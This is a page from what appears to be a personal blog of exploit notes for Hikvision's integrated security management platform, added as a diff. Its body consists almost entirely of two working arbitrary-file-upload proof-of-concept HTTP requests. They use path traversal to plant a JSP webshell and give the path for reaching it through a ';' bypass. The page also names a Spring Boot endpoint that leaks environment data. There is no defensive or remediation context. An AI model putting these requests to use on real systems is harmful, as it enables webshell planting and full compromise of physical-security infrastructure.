@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>海康威视 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6d77\u5eb7\u5a01\u89c6", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "HiKVISION \u7efc\u5408\u5b89\u9632\u7ba1\u7406\u5e73\u53f0", url: "#hikvision" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/" class="btn btn-xs btn-link">
+        深信服
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%B1%89%E5%BE%97srm/%E6%B1%89%E5%BE%97srm/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%B1%89%E5%BE%97srm/%E6%B1%89%E5%BE%97srm/" class="btn btn-xs btn-link">
+        汉得srm
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">海康威视</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#HiKVISION-综合安防管理平台">HiKVISION 综合安防管理平台</a><ul>
+<li><a href="#HiKVISION-综合安防管理平台-report-任意文件上传漏洞-POC">HiKVISION 综合安防管理平台 report 任意文件上传漏洞 POC</a></li>
+<li><a href="#HiKVISION-综合安防管理平台-files-任意文件上传漏洞-POC">HiKVISION 综合安防管理平台 files 任意文件上传漏洞 POC</a></li>
+<li><a href="#springboot信息泄露">springboot信息泄露</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="hikvision">HiKVISION 综合安防管理平台</h2>
+<h3 id="hikvision-report-poc">HiKVISION 综合安防管理平台 report 任意文件上传漏洞 POC</h3>
+<pre><code class="language-纯文本">POST /svm/api/external/report HTTP/1.1
+
+Host: 10.10.10.10
+
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+------WebKitFormBoundary9PggsiM755PLa54a
+
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp&quot;
+
+Content-Type: application/zip
+
+&lt;%jsp的马%&gt;
+
+------WebKitFormBoundary9PggsiM755PLa54a--
+</code></pre>
+<p>马儿路径：/portal/ui/login/..;/..;/new.jsp</p>
+<h3 id="hikvision-files-poc">HiKVISION 综合安防管理平台 files 任意文件上传漏洞 POC</h3>
+<pre><code class="language-纯文本">POST /center/api/files;.html HTTP/1.1
+
+Host: 10.10.10.10
+
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+------WebKitFormBoundary9PggsiM755PLa54a
+
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp&quot;
+
+Content-Type: application/zip
+
+&lt;%jsp的马%&gt;
+
+------WebKitFormBoundary9PggsiM755PLa54a--
+</code></pre>
+<p>马儿路径：/portal/ui/login/..;/..;/new.jsp</p>
+<h3 id="springboot">springboot信息泄露</h3>
+<pre><code class="language-纯文本">/artemis-portal/artemis/env
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D/" class="btn btn-xs btn-link">
+        深信服
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%B1%89%E5%BE%97srm/%E6%B1%89%E5%BE%97srm/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%B1%89%E5%BE%97srm/%E6%B1%89%E5%BE%97srm/" class="btn btn-xs btn-link">
+        汉得srm
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
